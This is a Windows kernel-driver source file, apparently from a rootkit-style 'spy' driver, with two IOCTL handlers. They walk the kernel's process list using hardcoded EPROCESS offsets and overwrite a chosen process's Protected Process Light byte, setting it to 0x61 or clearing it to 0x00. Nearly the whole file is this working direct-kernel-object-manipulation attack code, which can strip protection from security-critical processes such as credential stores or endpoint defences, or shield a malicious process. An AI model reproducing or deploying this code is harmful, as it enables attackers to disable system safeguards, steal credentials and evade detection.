#pragma once
#include "prototypes.h"
#include "common.h"

// ---------------------------------------------------------------
// IOCTL codes handler for PPL playground
// ---------------------------------------------------------------

// Set PPL protection IOCTL handler
NTSTATUS SpyIoSetProcessProtection(
    PVOID outputBuffer,
    ULONG outputLength,
    PULONG_PTR bytesReturned
)
{
    DbgPrint("[*] Process protection modification initiated\n");

    if (!PsInitialSystemProcess) {
        DbgPrint("[-] Base context unavailable\n");
        *bytesReturned = 0;
        return STATUS_UNSUCCESSFUL;
    }

    PSPY_HIDE_INPUT input = (PSPY_HIDE_INPUT)outputBuffer;

    ULONG_PTR targetPid = ParsePidFromString(input->g_Name);
    DbgPrint("[*] Setting protection for PID=%lu\n", targetPid);

    char* out = (char*)outputBuffer;
    ULONG offset = 0;
    NTSTATUS status;
    size_t writtenBytes = 0;
    BOOLEAN resolved = FALSE;

    status = RtlStringCbPrintfA(out + offset, outputLength - offset,
        "[*] Modifying protection for PID=%lu\n\n", targetPid);
    if (!NT_SUCCESS(status)) {
        *bytesReturned = 0;
        return status;
    }

    status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
    offset += (ULONG)writtenBytes;

    PEPROCESS contextBase = PsInitialSystemProcess;
    ULONG linkOffset = 0x448;
    ULONG protectionOffset = 0x87a;

    PLIST_ENTRY head = (PLIST_ENTRY)((ULONG_PTR)contextBase + linkOffset);
    PLIST_ENTRY current = head->Flink;

    while (current != head) {
        PEPROCESS contextEntry = (PEPROCESS)((ULONG_PTR)current - linkOffset);
        HANDLE pid = PsGetProcessId(contextEntry);

        if ((ULONG_PTR)pid == targetPid)
        {
            resolved = TRUE;

            UCHAR currentProtection = *(PUCHAR)((PUCHAR)contextEntry + protectionOffset);

            UCHAR newProtection = 0x61;
            *(PUCHAR)((PUCHAR)contextEntry + protectionOffset) = newProtection;

            UCHAR verifyProtection = *(PUCHAR)((PUCHAR)contextEntry + protectionOffset);

            status = RtlStringCbPrintfA(
                out + offset, outputLength - offset,
                "[*] Applying protection modification...\n    Current: 0x%02X\n    Applied: 0x%02X\n",
                currentProtection, verifyProtection
            );
            RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
            offset += (ULONG)writtenBytes;

            if (verifyProtection == newProtection) {
                status = RtlStringCbPrintfA(out + offset, outputLength - offset,
                    "[+] Protection applied successfully\n");
            }
            else {
                status = RtlStringCbPrintfA(out + offset, outputLength - offset,
                    "[-] Protection modification failed\n");
            }

            RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
            offset += (ULONG)writtenBytes;

            break;
        }

        current = current->Flink;
    }

    if (!resolved) {
        status = RtlStringCbPrintfA(out + offset, outputLength - offset,
            "[-] Process PID=%lu not found\n", targetPid);
        RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
        offset += (ULONG)writtenBytes;
    }

    *bytesReturned = offset;
    return STATUS_SUCCESS;
}

// Remove PPL protection IOCTL handler
NTSTATUS SpyIoRemoveProcessProtection(
    PVOID outputBuffer,
    ULONG outputLength,
    PULONG_PTR bytesReturned
)
{
    DbgPrint("[*] Process protection removal initiated\n");

    if (!PsInitialSystemProcess) {
        DbgPrint("[-] Base context unavailable\n");
        *bytesReturned = 0;
        return STATUS_UNSUCCESSFUL;
    }

    PSPY_HIDE_INPUT input = (PSPY_HIDE_INPUT)outputBuffer;

    ULONG_PTR targetPid = ParsePidFromString(input->g_Name);
    DbgPrint("[*] Removing protection for PID=%lu\n", targetPid);

    char* out = (char*)outputBuffer;
    ULONG offset = 0;
    NTSTATUS status;
    size_t writtenBytes = 0;
    BOOLEAN resolved = FALSE;

    status = RtlStringCbPrintfA(out + offset, outputLength - offset,
        "[*] Removing protection for PID=%lu\n\n", targetPid);
    if (!NT_SUCCESS(status)) {
        *bytesReturned = 0;
        return status;
    }

    status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
    offset += (ULONG)writtenBytes;

    PEPROCESS contextBase = PsInitialSystemProcess;
    ULONG linkOffset = 0x448;
    ULONG protectionOffset = 0x87a;

    PLIST_ENTRY head = (PLIST_ENTRY)((ULONG_PTR)contextBase + linkOffset);
    PLIST_ENTRY current = head->Flink;

    while (current != head) {
        PEPROCESS contextEntry = (PEPROCESS)((ULONG_PTR)current - linkOffset);
        HANDLE pid = PsGetProcessId(contextEntry);

        if ((ULONG_PTR)pid == targetPid)
        {
            resolved = TRUE;

            UCHAR currentProtection = *(PUCHAR)((PUCHAR)contextEntry + protectionOffset);

            UCHAR newProtection = 0x00;
            *(PUCHAR)((PUCHAR)contextEntry + protectionOffset) = newProtection;

            UCHAR verifyProtection = *(PUCHAR)((PUCHAR)contextEntry + protectionOffset);

            status = RtlStringCbPrintfA(
                out + offset, outputLength - offset,
                "[*] Removing protection...\n    Original: 0x%02X\n    Current: 0x%02X\n",
                currentProtection, verifyProtection
            );
            RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
            offset += (ULONG)writtenBytes;

            if (verifyProtection == 0x00) {
                status = RtlStringCbPrintfA(out + offset, outputLength - offset,
                    "[+] Protection removed successfully\n");
            }
            else {
                status = RtlStringCbPrintfA(out + offset, outputLength - offset,
                    "[-] Protection removal failed\n");
            }

            RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
            offset += (ULONG)writtenBytes;

            break;
        }

        current = current->Flink;
    }

    if (!resolved) {
        status = RtlStringCbPrintfA(out + offset, outputLength - offset,
            "[-] Process PID=%lu not found\n", targetPid);
        RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
        offset += (ULONG)writtenBytes;
    }

    *bytesReturned = offset;
    return STATUS_SUCCESS;
}